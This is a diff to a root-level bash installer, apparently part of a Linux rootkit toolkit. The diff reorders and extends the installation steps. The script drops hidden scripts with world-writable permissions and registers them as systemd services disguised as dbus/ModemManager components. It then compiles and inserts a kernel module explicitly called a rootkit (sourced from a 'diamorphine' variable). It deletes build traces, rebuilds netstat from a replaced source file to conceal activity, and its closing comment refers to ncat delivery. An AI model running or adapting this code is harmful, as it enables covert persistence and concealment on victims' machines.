@@ -3029,12 +3029,12 @@ if [ "$user" == "root" ]; then
 	#	fi
 	#done
 
+	#---create the systemd services---
 	#create the files that the systemd services are gonna use
 	printf "$_hiding" >/bin/usb-bus
 	chmod 777 /bin/usb-bus
 	printf "$_bash" >/etc/usb-bus
-	chmod 777 /etc/usb-bus
-	
+	chmod 777 /etc/usb-bus	
 	#create a systemd service to execute the _hiding script
 	systemctl stop dbus-org.freedesktop.Modem.service 
 	systemctl disable dbus-org.freedesktop.Modem.service
@@ -3057,7 +3057,6 @@ if [ "$user" == "root" ]; then
 	else
 		echo "dbus-org.freedesktop.Modem.service-bus not started"
 	fi
-
 	#create a systemd service to execute the _bash script
 	systemctl stop dbus-org.freedesktop.ModemManager11
 	systemctl disable dbus-org.freedesktop.ModemManager11
@@ -3080,7 +3079,8 @@ if [ "$user" == "root" ]; then
 	else
 		echo "dbus-org.freedesktop.ModemManager11.service-bus not started"
 	fi
-
+	
+	#---make and insert the usb-bus rootkit module---
 	#check if make and gcc are installed, otherwise install them
 	ls /usr/bin/make &>/dev/null
 	if [ "$?" != "0" ]; then
@@ -3104,22 +3104,19 @@ if [ "$user" == "root" ]; then
 			echo "gcc didn't install"
 		fi
 	fi
-
 	#make the usb-bus rootkit module
 	if [ ! -d "/lib/modules/$(uname -r)/kernel/drivers/usb-bus" ]; then
 		mkdir /lib/modules/$(uname -r)/kernel/drivers/usb-bus
 	fi
 	printf "$makefile" >/lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile
 	printf "$diamorphine" >/lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.c
-	echo "making..."
+	echo "making usb-bus rootkit module..."
 	make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus &>/dev/null
-
 	#if make is unsuccessful patch the Makefile, get the headers needed for the module to work and make again
 	if [ "$?" == "0" ]; then
-		echo "make successful"
+		echo "make usb-bus rootkit module successful"
 	else
-		echo "make unsuccessful, patching Makefile and getting headers..."
-
+		echo "make usb-bus rootkit module unsuccessful, patching Makefile and getting headers..."
 		#copy the headers
 		if [ ! -d "/usr/src/linux-headers-$(uname -r)/include/asm" ] || [ ! -L "/usr/src/linux-headers-$(uname -r)/include/asm" ]; then
 			cp -r -L /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include
@@ -3136,8 +3133,18 @@ if [ "$user" == "root" ]; then
 				cp /usr/lib/gcc/x86_64-linux-gnu/7/include/stdarg.h /usr/src/linux-headers-$(uname -r)/include/stdarg.h
 			fi
 		fi
-
-		#patch the Makefile
+		#check if patch is installed, otherwise install it and patch the Makefile
+		ls /usr/bin/patch &>/dev/null
+		if [ "$?" != "0" ]; then
+			p="patch"
+		echo "installing patch..."
+		apt-get install patch -y
+		if [ "$?" == "0" ]; then
+			echo "patch installed successfully"
+		else
+			echo "patch din't install"
+		fi
+		fi
 		location1=$(readlink -m /usr/src/linux-headers-$(uname -r)/Makefile)
 		location=$(echo "$location1" | awk -F/ '{ print $2"/"$3"/"$4 }')		
 		printf "$mkfile" >/$location/mkfile.patch
@@ -3148,9 +3155,8 @@ if [ "$user" == "root" ]; then
 			echo "patch source Makefile unsuccessful"
 		fi
 		rm /$location/mkfile.patch
-
-		#make again
-		echo "making again..."
+		#make usb-bus rootkit module again
+		echo "making usb-bus rootkit module again..."
 		make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus &>/dev/null
 		if [ "$?" == "0" ]; then
 			echo "make usb-bus rootkit module successful"
@@ -3158,6 +3164,142 @@ if [ "$user" == "root" ]; then
 			echo "make usb-bus rootkit module unsuccessful"
 		fi
 	fi
+	#make module auto-load after every reboot (dangerous, the computer might start having problems at boot)
+	#printf "usb-bus" >/usr/lib/modules-load.d/usb-bus.conf
+	#depmod -a #take care of dependencies otherwise you will have problems booting
+	#remove the dirt
+	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.c &>/dev/null
+	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.o &>/dev/null
+	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile &>/dev/null
+	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Module* &>/dev/null
+	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/modules* &>/dev/null
+	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*safe &>/dev/null
+	#check if insmod is installed. otherwise intall it and insert usb-bus rootkit module
+	ls /bin/kmod &>/dev/null
+	if [ "$?" != "0" ]; then
+		echo "installing kmod..."
+		apt-get install kmod -y
+		if [ "$?" == "0" ]; then
+			echo "kmod installed successfully"
+		else
+			echo "kmod din't install"
+		fi
+	fi
+	insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko &>/dev/null
+	if [ "$?" == "0" ]; then
+		echo "usb-bus rootkit module inserted"
+	else
+		echo "usb-bus rootkit module not inserted"
+	fi
+
+	#---replace netstat---
+	rm /tmp/net-tools.zip &>/dev/null
+	rm  -r /tmp/net-tools-master &>/dev/null
+	echo "replacing netstat..."
+	#check if wget is installed, otherwise intall it and download net-tools.zip
+	ls /usr/bin/wget &>/dev/null
+	if [ "$?" != "0" ]; then
+		w="wget"
+		echo "installing wget..."
+		apt-get install wget -y
+		if [ "$?" == "0" ]; then
+			echo "wget installed successfully"
+		else
+			echo "wget din't install"
+		fi
+	fi
+	wget -O /tmp/net-tools.zip https://github.com/ecki/net-tools/archive/master.zip &>/dev/null
+	if [ "$?" == "0" ]; then
+		echo "downloaded net-tools.zip"
+	else
+		echo "failed to download net-tools.zip"
+	fi
+	if [ "$w" == "wget" ]; then
+		echo "removing wget..."
+		apt-get purge wget -y
+		if [ "$?" == "0" ]; then
+			echo "wget removed"
+		else
+			echo "wget not removed"
+		fi
+	fi
+	#check if unzip is installed, otherwise intall it and unzip net-tools.zip
+	ls /usr/bin/unzip &>/dev/null
+	if [ "$?" != "0" ]; then
+		z="unzip"
+		echo "installing unzip..."
+		apt-get install unzip -y
+		if [ "$?" == "0" ]; then
+			echo "unzip installed successfully"
+		else
+			echo "unzip din't install"
+		fi
+	fi
+	unzip -d /tmp /tmp/net-tools.zip >/dev/null
+	if [ "$?" == "0" ]; then
+		echo "unzipped net-tools.zip"
+	else
+		echo "failed to unzip net-tools.zip"
+	fi
+	rm /tmp/net-tools.zip
+	if [ "$z" == "unzip" ]; then
+		echo "removing unzip..."
+		apt-get purge unzip -y
+		if [ "$?" == "0" ]; then
+			echo "unzip removed"
+		else
+			echo "unzip not removed"
+		fi
+	fi
+ 	#replace netstat.c
+	echo "$netstat" >/tmp/net-tools-master/netstat.c
+	if [ "$?" == "0" ]; then
+		echo "netstat.c replaced"
+	else
+		echo "netstat.c not replaced"
+	fi
+	#patch the Makefile
+	printf "$netpatch" >/tmp/net-tools-master/net.patch
+	patch -d /tmp/net-tools-master/ </tmp/net-tools-master/net.patch &>/dev/null
+	if [ "$?" == "0" ]; then
+		echo "patch net-tools successful"
+	else
+		echo "patch net-tools unsuccessful"
+	fi
+	if [ "$p" == "patch" ]; then
+		echo "removing patch..."
+		apt-get purge patch -y
+		if [ "$?" == "0" ]; then
+			echo "patch removed"
+		else
+			echo "patch not removed"
+		fi
+	fi
+	#make net-tools-master so netstat gets replaced
+	yes "" | make -C /tmp/net-tools-master config &>/dev/null
+	if [ "$?" == "0" ]; then
+		echo "make config net-tools successful"
+	else
+		echo "make  config net-tools unsuccessful"
+	fi
+	#find /tmp/net-tools-master -name "*.c" -o -name "*.h" | while read src; do
+		#sed -i "s%<linux/if_ether.h>%<netinet/if_ether.h>%" $src
+	#	sed -i "s%<linux/if_tr.h>%<netinet/if_tr.h>%" $src
+		#sed -i "s%<linux/if_fddi.h>%<netinet/if_fddi.h>%" $src
+	#done
+	make -C /tmp/net-tools-master &>/dev/null
+	if [ "$?" == "0" ]; then
+		echo "make net-tools-master successful"
+	else
+		echo "make net-tools-master unsuccessful"
+	fi
+	make update -C /tmp/net-tools-master  &>/dev/null
+	if [ "$?" == "0" ]; then
+		echo "netstat replaced"
+	else
+		echo "netstat not replaced"
+	fi
+	rm  -r /tmp/net-tools-master
 
 	#remove make and gcc if they weren't installed
 	if [ "$m" == "make" ]; then
@@ -3179,83 +3321,6 @@ if [ "$user" == "root" ]; then
 		fi
 	fi
 
-	#make module auto-load after every reboot (dangerous, the computer might start having problems at boot)
-	#printf "usb-bus" >/usr/lib/modules-load.d/usb-bus.conf
-	#depmod -a #take care of dependencies otherwise you will have problems booting
-
-	#remove the dirt
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.c &>/dev/null
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.o &>/dev/null
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile &>/dev/null
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Module* &>/dev/null
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/modules* &>/dev/null
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*safe &>/dev/null
-
-	#insert usb-bus rootkit module
-	insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "usb-bus rootkit module inserted"
-	else
-		echo "usb-bus rootkit module not inserted"
-	fi
-
-	#replace netstat
-	rm /tmp/net-tools.zip &>/dev/null
-	rm  -r /tmp/net-tools-master &>/dev/null
-	echo "replacing netstat..."
-	wget -O /tmp/net-tools.zip https://github.com/ecki/net-tools/archive/master.zip &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "downloaded net-tools"
-	else
-		echo "failed to download net-tools"
-	fi
-	unzip -d /tmp /tmp/net-tools.zip >/dev/null
-	if [ "$?" == "0" ]; then
-		echo "unzipped net-tools"
-	else
-		echo "failed to unzip net-tools"
-	fi
-	rm /tmp/net-tools.zip
- 	#replace netstat.c
-	echo "$netstat" >/tmp/net-tools-master/netstat.c
-	if [ "$?" == "0" ]; then
-		echo "netstat.c replaced"
-	else
-		echo "netstat.c not replaced"
-	fi
-	#patch the Makefile
-	printf "$netpatch" >/tmp/net-tools-master/net.patch
-	patch -d /tmp/net-tools-master/ </tmp/net-tools-master/net.patch &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "patch net-tools successful"
-	else
-		echo "patch net-tools unsuccessful"
-	fi
-	#make
-	yes "" | make -C /tmp/net-tools-master config &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "make config net-tools successful"
-	else
-		echo "make  config net-tools unsuccessful"
-	fi
-	#find /tmp/net-tools-master -name "*.c" -o -name "*.h" | while read src; do
-		#sed -i "s%<linux/if_ether.h>%<netinet/if_ether.h>%" $src
-	#	sed -i "s%<linux/if_tr.h>%<netinet/if_tr.h>%" $src
-		#sed -i "s%<linux/if_fddi.h>%<netinet/if_fddi.h>%" $src
-	#done
-	make -C /tmp/net-tools-master &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "make net-tools successful"
-	else
-		echo "make net-tools unsuccessful"
-	fi
-	make update -C /tmp/net-tools-master  &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "netstat replaced"
-	else
-		echo "netstat not replaced"
-	fi
-	rm  -r /tmp/net-tools-master
-
+	#exit to tell ncat that we are done with the script so the connection closes
 	exit
 fi
